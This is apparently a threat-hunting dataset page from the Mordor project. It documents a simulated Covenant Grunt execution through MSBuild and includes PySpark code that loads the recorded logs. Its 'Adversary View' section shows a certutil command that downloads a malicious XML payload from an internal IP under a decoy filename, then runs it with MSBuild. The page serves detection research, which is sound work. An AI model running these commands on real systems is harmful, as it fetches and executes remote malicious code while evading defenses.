# Covenant Grunt Msbuild

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-191027042312 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/10/27 |
| platform              | Windows |
| Tactic(s)             | ['[TA0002](https://attack.mitre.org/tactics/TA0002)', '[TA0005](https://attack.mitre.org/tactics/TA0005)'] |
| Technique(s)          | ['[T1127.001](https://attack.mitre.org/techniques/T1127/001)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | [None] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/covenant_msbuild_grunt.tar.gz |
| References        | None |

## Dataset Description
This dataset represents adversaries using trusted windows utilities such as msbuild to proxy execution of malicious code.

## Adversary View
```
RDP to compromised endpoint
opened as Administrator and ran the following:
certutil.exe -urlcache -split -f http://172.18.39.8/msbuildGrunt.xml C:\ProgramData\salaries.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\ProgramData\salaries.xml
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/covenant_msbuild_grunt.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        